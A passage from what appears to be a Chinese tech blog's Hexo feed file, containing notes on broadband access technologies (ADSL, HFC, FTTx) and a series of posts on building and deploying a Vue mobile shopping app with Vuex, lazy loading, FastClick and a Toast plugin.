</p><p>设立SONET/SDH标准的意义</p><ol><li>使不同的数字传输体制在 STM-1 等级上获得了统一。</li><li>第一次真正实现了数字传输体制上的世界性标准。</li><li>已成为公认的新一代理想的传输网体制。</li><li>SDH 标准也适合于微波和卫星传输的技术体制。</li></ol><h1 id="宽带接入技术"><a href="#宽带接入技术" class="headerlink" title="宽带接入技术"></a>宽带接入技术</h1><p>用户要连接到互联网，必须先连接到某个ISP。<br>在互联网的发展初期，用户都是利用电话的用户线通过调制解调器连接到ISP的，电话用户线接入到互联网的速率最高仅达到56 kbit/s。<br>美国联邦通信委员会FCC原来认为只要双向速率之和超过200 kbit/s 就是宽带。</p><p>但 2015 年重新定义为：<br>宽带下行速率要达到 25 Mbit/s<br>宽带上行速率要达到 3 Mbit/s</p><p>从宽带接入的媒体来看，可以划分为两大类：</p><ol><li>有线宽带接入</li><li>无线宽带接入</li></ol><p>下面首先介绍有线带宽技术</p><h2 id="ADSL技术"><a href="#ADSL技术" class="headerlink" title="ADSL技术"></a>ADSL技术</h2><ul><li>非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术就是<strong>用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务</strong>。</li><li>标准模拟电话信号的频带被限制在 300~3400 Hz 的范围内，但用户线本身实际可通过的信号频率仍然超过 1 MHz。</li><li>ADSL 技术就把 0~4 kHz 低端频谱留给传统电话使用，而把<strong>原来没有被利用的高端频谱留给用户上网使用</strong>。</li><li>DSL 就是数字用户线 (Digital Subscriber Line) 的缩写。</li></ul><h3 id="ADSL传输距离"><a href="#ADSL传输距离" class="headerlink" title="ADSL传输距离"></a>ADSL传输距离</h3><ul><li><p>ADSL 的传输距离取决于数据率和用户线的线径（用户线越细，信号传输时的衰减就越大）。</p></li><li><p>ADSL 所能得到的最高数据传输速率与实际的用户线上的信噪比密切相关。</p></li><li><p>例如：</p><ol><li>0.5 毫米线径的用户线，传输速率为 1.5~2.0 Mbit/s 时可传送5.5公里，但当传输速率提高到 6.1 Mbit/s 时，传输距离就缩短为 3.7 公里。</li><li>如果把用户线的线径减小到 0.4 毫米，那么在 6.1 Mbit/s 的传输速率下就只能传送 2.7 公里。</li></ol></li></ul><h3 id="ADSL特点"><a href="#ADSL特点" class="headerlink" title="ADSL特点"></a>ADSL特点</h3><ul><li>上行和下行带宽做成不对称的。上行指从用户到 ISP，而下行指从 ISP 到用户。</li><li>ADSL 在用户线（铜线）的两端各安装一个 ADSL 调制解调器。</li><li>我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。</li></ul><p>这里的“多音调”就是“多载波”或“多子信道”的意思。</p><p>由于用户线的具体条件往往相差很大（距离、线径、受到相邻用户线的干扰程度等都不同），因此 ADSL 采用自适应调制技术使用户线能够传送尽可能高的数据率。</p><p>当 ADSL 启动时，用户线两端的 ADSL 调制解调器就测试可用的频率、各子信道受到的干扰情况，以及在每一个频率上测试信号的传输质量。</p><p>ADSL 不能保证固定的数据率。对于质量很差的用户线甚至无法开通 ADSL。通常下行数据率在32 kbit/s到6.4 Mbit/s之间，而上行数据率在 32 kbit/s 到 640 kbit/s 之间。</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414111353539.png" alt="image-20210414111353539"></p><h3 id="第二代-ADSL"><a href="#第二代-ADSL" class="headerlink" title="第二代 ADSL"></a>第二代 ADSL</h3><p>包括 ADSL2（G.992.3 和 G.992.4）和 ADSL2+（G.992.5）。<br>通过提高调制效率得到了<strong>更高的数据率</strong>。</p><ol><li>ADSL2 要求至少应支持下行 8 Mbit/s、上行 800 kbit/s的速率。</li><li>ADSL2+ 则将频谱范围从 1.1 MHz 扩展至 2.2 MHz，下行速率可达 16 Mbit/s（最大传输速率可达 25 Mbit/s），而上行速率可达 800 kbit/s。</li></ol><p>采用了<strong>无缝速率自适应技术 SRA</strong> (Seamless Rate Adaptation)，可在运营中不中断通信和不产生误码的情况下，自适应地调整数据率。<br><strong>改善了线路质量评测和故障定位功能</strong>，这对提高网络的运行维护水平具有非常重要的意义。</p><h2 id="光纤同轴混合网（HFC网）"><a href="#光纤同轴混合网（HFC网）" class="headerlink" title="光纤同轴混合网（HFC网）"></a>光纤同轴混合网（HFC网）</h2><p>HFC (Hybrid Fiber Coax) 网是在目前覆盖面很广的有线电视网 CATV 的基础上开发的一种居民宽带接入网。HFC 网除可传送 CATV 外，还提供电话、数据和其他宽带交互型业务。</p><p>现有的 CATV 网是树形拓扑结构的同轴电缆网络，它采用模拟技术的频分复用对电视节目进行单向传输。</p><p>HFC 网对 CATV 网进行了改造。 HFC 网将原 CATV 网中的同轴电缆主干部分改换为光纤，并使用模拟光纤技术。</p><p>在模拟光纤中采用光的振幅调制AM，这比使用数字光纤更为经济。模拟光纤从头端连接到光纤结点 (fiber node)，即光分配结点 ODN (Optical Distribution Node)。在光纤结点光信号被转换为电信号。在光纤结点以下就是同轴电缆。 </p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210305122236143.png" alt="image-20210305122236143"></p><p>HFC 网具有双向传输功能，扩展了传输频带</p><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414112615655.png" alt="image-20210414112615655"></p><h3 id="实现方式（用户接口盒）"><a href="#实现方式（用户接口盒）" class="headerlink" title="实现方式（用户接口盒）"></a>实现方式（用户接口盒）</h3><p><strong>用户接口盒 UIB</strong> (User Interface Box) 要提供三种连接，即：</p><ol><li>使用同轴电缆连接到机顶盒 (set-top box)，然后再连接到用户的电视机。</li><li>使用双绞线连接到用户的电话机。</li><li>使用电缆调制解调器连接到用户的计算机。</li></ol><p>电缆调制解调器是为 HFC 网而使用的调制解调器。电缆调制解调器最大的特点就是传输速率高。<br>下行速率一般在 3 ~ 10 Mbit/s之间，最高可达 30 Mbit/s。<br>上行速率一般为 0.2 ~ 2 Mbit/s，最高可达 10 Mbit/s。</p><p>电缆调制解调器比在普通电话线上使用的调制解调器要复杂得多，并且不是成对使用，而是只安装在用户端。 </p><blockquote><p>最后对比下HFC和ADSL，在使用ADSL调制解调器时，用户计算机所连接的电话用户线是该用户专用的，因此在用户线上所能达到的最高速率是确定的，与其它ADSL用户是否在上网无关。但在使用HFC时，因为某个用户所能享受的数据率大小取决于这段电缆上现在又多少个用户在传送数据，如果出现大量用户在同时上网的话，那么每个用户实际的上网速率会低到难以忍受的程度</p></blockquote><h2 id="FTTx-技术"><a href="#FTTx-技术" class="headerlink" title="FTTx 技术"></a>FTTx 技术</h2><ul><li><p>FTTx 是一种实现宽带居民接入网的方案，代表多种宽带光纤接入方式。</p></li><li><p>FTTx 表示 Fiber To The…（光纤到…），例如：</p><ol><li>光纤到户 FTTH (Fiber To The Home)：光纤一直铺设到用户家庭，可能是居民接入网最后的解决方法。</li><li>光纤到大楼 FTTB (Fiber To The Building)：光纤进入大楼后就转换为电信号，然后用电缆或双绞线分配到各用户。</li><li>光纤到路边 FTTC (Fiber To The Curb)：光纤铺到路边，从路边到各用户可使用星形结构双绞线作为传输媒体。</li></ol></li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/05/%E7%89%A9%E7%90%86%E5%B1%82/image-20210414113339827.png" alt="image-20210414113339827"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13.项目部署</title>
      <link href="/2021/03/02/13.%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/03/02/13.%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows项目部署（nginx）"><a href="#Windows项目部署（nginx）" class="headerlink" title="Windows项目部署（nginx）"></a>Windows项目部署（nginx）</h1><p><a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">官网地址</a>：最好选择Stable version版本安装</p><p>然后就是解压直接双击启动exe，将html以及相关文件放到html文件夹下</p><p>浏览器输入localhost即可运行该服务</p><h1 id="Windows项目部署（Node）"><a href="#Windows项目部署（Node）" class="headerlink" title="Windows项目部署（Node）"></a>Windows项目部署（Node）</h1><p>安装相关node服务器所需包(art-template模板引擎以及express框架)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i express --save</span><br><span class="line">npm i art-template express-art-template --save</span><br></pre></td></tr></table></figure><p>搭建一个简单的node服务器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//开放资源</span></span><br><span class="line">app.use(<span class="string">'/public'</span>, express.static(<span class="string">'./public/'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置模板引擎</span></span><br><span class="line"><span class="comment">//模板默认渲染后缀名</span></span><br><span class="line">app.engine(<span class="string">'html'</span>, <span class="built_in">require</span>(<span class="string">"express-art-template"</span>))</span><br><span class="line"><span class="comment">//模板默认路径</span></span><br><span class="line">app.set(<span class="string">'/views'</span>, path.join(__dirname, <span class="string">'./views/'</span>))</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req,res) =&gt; &#123;</span><br><span class="line">  res.render(<span class="string">'index.html'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'server is running...'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>修改下npm run server时的打包配置，因为node服务器中相关的资源文件放在public文件夹内，所以我们定义打包后的资源引用路径（vue.config.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">publicPath: <span class="string">'/public'</span></span><br></pre></td></tr></table></figure><p>之后执行打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>将css、js、img文件夹复制到public文件夹下</p><p>将html以及图标文件复制到view下</p><p>node服务器根目录下运行服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>这样就部署完成，其实这个和我们平时在开发环境中执行的<code>npm run server</code>过程类似</p><h1 id="Linux远程项目部署-nginx"><a href="#Linux远程项目部署-nginx" class="headerlink" title="Linux远程项目部署(nginx)"></a>Linux远程项目部署(nginx)</h1><p>一般使用Centos作为Linux的服务器，使用较多的操作系统为Ubuntu</p><p><a href="https://www.vandyke.com/download/securecrt/6.7/index.html" target="_blank" rel="noopener">secureCRT</a>搭配<a href="https://winscp.net/eng/docs/lang:chs" target="_blank" rel="noopener">WinSCP</a>使用</p><p>远程安装nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure><p>修改相关配置文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> nginx.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12.postcss-px-to-viewport（CSS单位转换）</title>
      <link href="/2021/03/02/12.postcss-px-to-viewport%EF%BC%88CSS%E5%8D%95%E4%BD%8D%E8%BD%AC%E6%8D%A2%EF%BC%89/"/>
      <url>/2021/03/02/12.postcss-px-to-viewport%EF%BC%88CSS%E5%8D%95%E4%BD%8D%E8%BD%AC%E6%8D%A2%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>简介：A plugin for <a href="https://github.com/postcss/postcss" target="_blank" rel="noopener">PostCSS</a> that generates viewport units (vw, vh, vmin, vmax) from pixel units.</p></blockquote><p><a href="https://github.com/evrone/postcss-px-to-viewport" target="_blank" rel="noopener">GitHub地址</a></p><ol><li><p>安装(开发环境)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i postcss-px-to-viewport --save-dev</span><br></pre></td></tr></table></figure></li><li><p>导入（main.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> VueLazyLoad <span class="keyword">from</span> <span class="string">'vue-lazyload'</span></span><br></pre></td></tr></table></figure></li><li><p>使用（创建postcss.config.js文件进行相关配置），注意<strong>创建完</strong>或改完最好重新启动下服务（否则可能没更新）</p><p>相关配置可以到官网查看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  plugins: &#123;</span><br><span class="line">    autoprefixer: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"postcss-px-to-viewport"</span>:&#123; </span><br><span class="line">      viewportWidth: <span class="number">375</span>, <span class="comment">//视窗的宽度，对应的是我们设计稿的宽度</span></span><br><span class="line">      viewportHeight: <span class="number">667</span>, <span class="comment">//视窗的高度, 对应的是设计稿的高度</span></span><br><span class="line">      unitPrecision: <span class="number">5</span>, <span class="comment">//指定'px'转换为视窗单位值的小数位数</span></span><br><span class="line">      viewportUnit: <span class="string">'vw'</span>, <span class="comment">//指定需要转换成的视窗单位</span></span><br><span class="line">      <span class="comment">//selectorBlackList: ['ignore','tab-bar','tab-bar-item'],//指定不需要转换的类,按正则方式来</span></span><br><span class="line">      minPixelValue: <span class="number">1</span>, <span class="comment">//小于或等于'1px'不转换为视窗单位</span></span><br><span class="line">      mediaQuery: <span class="literal">false</span>, <span class="comment">//允许在媒体查询中转换'px'</span></span><br><span class="line">      <span class="comment">//exclude: [/TabBar/] //[]内为JS正则表达式</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11.vue-lazyload（图片懒加载）</title>
      <link href="/2021/03/02/11.vue-lazyload%EF%BC%88%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD%EF%BC%89/"/>
      <url>/2021/03/02/11.vue-lazyload%EF%BC%88%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>简介：Vue module for lazyloading images in your applications. Some of goals of this project worth noting include:</p><ul><li>Be lightweight, powerful and easy to use</li><li>Work on any image type</li><li>Add loading class while image is loading</li><li>Supports both of Vue 1.0 and Vue 2.0</li></ul></blockquote><p><a href="https://github.com/hilongjw/vue-lazyload" target="_blank" rel="noopener">GitHub地址</a></p><ol><li><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i vue-lazyload --save</span><br></pre></td></tr></table></figure></li><li><p>导入（main.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> VueLazyLoad <span class="keyword">from</span> <span class="string">'vue-lazyload'</span></span><br></pre></td></tr></table></figure></li><li><p>使用（相关配置项可以到官网查看）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//图片懒加载</span></span><br><span class="line">Vue.use(VueLazyLoad, &#123;</span><br><span class="line">  loading: <span class="built_in">require</span>(<span class="string">'./assets/img/common/placeholder.png'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.解决移动端300ms延迟</title>
      <link href="/2021/03/02/10.%E8%A7%A3%E5%86%B3%E7%A7%BB%E5%8A%A8%E7%AB%AF300ms%E5%BB%B6%E8%BF%9F(fastClick)/"/>
      <url>/2021/03/02/10.%E8%A7%A3%E5%86%B3%E7%A7%BB%E5%8A%A8%E7%AB%AF300ms%E5%BB%B6%E8%BF%9F(fastClick)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>简介：FastClick is a simple, easy-to-use library for eliminating the 300ms delay between a physical tap and the firing of a event on mobile browsers. The aim is to make your application feel less laggy and more responsive while avoiding any interference with your current logic.</p></blockquote><p><a href="https://github.com/ftlabs/fastclick" target="_blank" rel="noopener">GitHub地址</a></p><ol><li><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i fastclick --save</span><br></pre></td></tr></table></figure></li><li><p>导入（main.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> FastClick <span class="keyword">from</span> <span class="string">'fastclick'</span></span><br></pre></td></tr></table></figure></li><li><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用fastClick,解决300ms延迟，全局使用</span></span><br><span class="line">FastClick.attach(<span class="built_in">document</span>.body)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.封装Toast</title>
      <link href="/2021/03/02/9.%E5%B0%81%E8%A3%85Toast/"/>
      <url>/2021/03/02/9.%E5%B0%81%E8%A3%85Toast/</url>
      
        <content type="html"><![CDATA[<p>如下图所示，我们要创建如下图所示的提示信息，也就是在点击加入购物车后显示提示信息</p><p><img src= "/img/loading.gif" data-src="/2021/03/02/9.%E5%B0%81%E8%A3%85Toast/image-20210205212350329.png" alt="image-20210205212350329"></p><p>一般的思路就是创建对应的组件，然后在props定义一个message用来接收使用该组件所要传递的值，和一个isShow用来确定它是否显示，然后再在引用他的组件中去绑定isShow和message，同时在methods去实现点击或者其他操作时弹窗具体内容以及显示的时间（setTimeout()）,这是一般我们的封装思想以及思路，但是在每个要引用它的组件都要做相应的操作以及传递message和isShow，并不是很方便，可不可以直接通过一个方法就实现该操作呢</p><p>例如，可不可以通过$toast.show(message，time)就可以实现弹窗内容以及弹窗显示时间呢，既然我都说了，那答案必须是肯定的</p><p>首先我们在components的common创建toast文件夹，以及创建Toast.vue和index.js文件，toast先设置相关的样式</p><p>在index.js中，我们主要做这几件事，Toast组件的创建、挂载以及导出等</p><p>定义一个obj对象用来存储一个安装函数install，从而安装toast（注意：install是固定的，不允许改成其它名字，否则会安装失败）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Toast <span class="keyword">from</span> <span class="string">'./Toast'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//必须为install</span></span><br><span class="line">obj.install = <span class="function"><span class="keyword">function</span>(<span class="params">Vue</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//1.创建组件构造器</span></span><br><span class="line">  <span class="keyword">const</span> toastContructor = Vue.extend(Toast)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.创建组件</span></span><br><span class="line">  <span class="keyword">const</span> toast = <span class="keyword">new</span> toastContructor()</span><br><span class="line"></span><br><span class="line">  <span class="comment">//3.手动挂载</span></span><br><span class="line">  toast.$mount(<span class="built_in">document</span>.createElement(<span class="string">'div'</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment">//4.添加至页面</span></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(toast.$el)</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//5.挂载在Vue实例上</span></span><br><span class="line">  Vue.prototype.$toast = toast</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> obj</span><br></pre></td></tr></table></figure><p>然后就是在main.js导入并安装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//toast导入</span></span><br><span class="line"><span class="keyword">import</span> toast <span class="keyword">from</span> <span class="string">'components/common/toast/index'</span></span><br><span class="line"><span class="comment">//安装toast</span></span><br><span class="line">Vue.use(toast)</span><br></pre></td></tr></table></figure><p>然后再在toast.vue去完成组件使用方法（放出全部js代码）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'Toast'</span>,</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      isShow: <span class="literal">false</span>,</span><br><span class="line">      message: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    show(message, duration=<span class="number">2000</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.isShow = <span class="literal">true</span></span><br><span class="line">      <span class="keyword">this</span>.message = message</span><br><span class="line"></span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.isShow = <span class="literal">false</span></span><br><span class="line">      &#125;,duration)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们在需要用到该组件的地方就可以直接通过this.$toast.show(message，time)去实现了，不需要导入任何其它组件，因为在该项目里已经全局定义了</p><p>在Detail实现，这样我们就可以根据之前所做的Promise，将商品状态展示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.addCart(product).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.$toast.show(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.Actions使用Promise</title>
      <link href="/2021/03/02/8.Actions%E4%BD%BF%E7%94%A8promise/"/>
      <url>/2021/03/02/8.Actions%E4%BD%BF%E7%94%A8promise/</url>
      
        <content type="html"><![CDATA[<p>获取当前商品的购物车状态</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">addCart(context, payload) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> oldProduct = context.state.cartList.find(<span class="function"><span class="params">item</span> =&gt;</span> item.iid === payload.iid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldProduct) &#123;</span><br><span class="line">      context.commit(<span class="string">'addCounter'</span>, oldProduct)</span><br><span class="line">      resolve(<span class="string">'商品数量+1'</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      payload.count = <span class="number">1</span></span><br><span class="line">      context.commit(<span class="string">'addToCart'</span>, payload)</span><br><span class="line">      resolve(<span class="string">'成功添加商品'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在需要调用该方法的地方直接进行映射（mapActions）</p><p>首先导入mapActions</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入vuex的action</span></span><br><span class="line"><span class="keyword">import</span> &#123;mapActions&#125; <span class="keyword">from</span> <span class="string">'vuex'</span></span><br></pre></td></tr></table></figure><p>methods进行映射</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...mapActions([&#39;addCart&#39;])</span><br></pre></td></tr></table></figure><p>在需要的地方直接调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.addCart(product).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">   <span class="built_in">console</span>(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.购物车</title>
      <link href="/2021/03/02/7.%E8%B4%AD%E7%89%A9%E8%BD%A6/"/>
      <url>/2021/03/02/7.%E8%B4%AD%E7%89%A9%E8%BD%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="Vuex存储相关信息"><a href="#Vuex存储相关信息" class="headerlink" title="Vuex存储相关信息"></a>Vuex存储相关信息</h2><ol><li><p>安装vuex</p></li><li><p>vuex初始化（可能安装完就帮你初始化好了）</p></li><li><p>加入购物车相关逻辑</p></li></ol><p>state定义一个cartList数组存储相关加入购物车的商品</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state: &#123;</span><br><span class="line">  cartList: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vuex不建议我们在vuex外面去修改state的属性，所以我们在这里定义一个添加商品的相关mutation</p><p>方法思路如下</p><ol><li>首先对已有的商品进行遍历，如果购物车已经有该商品，定义oldProduct接收该值（浅拷贝→引向同个内存地址）</li><li>如果该商品存在，则将其的数量加上一</li><li>如果没有，则定义一个该商品的数量属性，之后，存储至cartList中去</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mutations: &#123;</span><br><span class="line">  addCart(context, payload) &#123;</span><br><span class="line">    <span class="keyword">let</span> 